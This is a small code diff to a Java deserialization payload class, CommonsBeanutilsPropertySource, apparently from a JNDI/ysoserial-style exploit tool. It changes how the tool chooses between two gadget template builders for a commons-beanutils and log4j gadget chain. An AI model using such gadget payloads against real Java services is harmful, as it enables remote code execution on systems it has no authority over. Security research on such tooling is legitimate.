@@ -11,6 +11,7 @@ import org.apache.logging.log4j.util.PropertySource;
 
 import java.util.PriorityQueue;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.logging.log4j:log4j-core:2.17.1"})
@@ -19,7 +20,7 @@ public class CommonsBeanutilsPropertySource implements ObjectPayload<Object>{
     @Override
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object template;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             template = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             template = Gadgets.createTemplatesImpl(type, param);
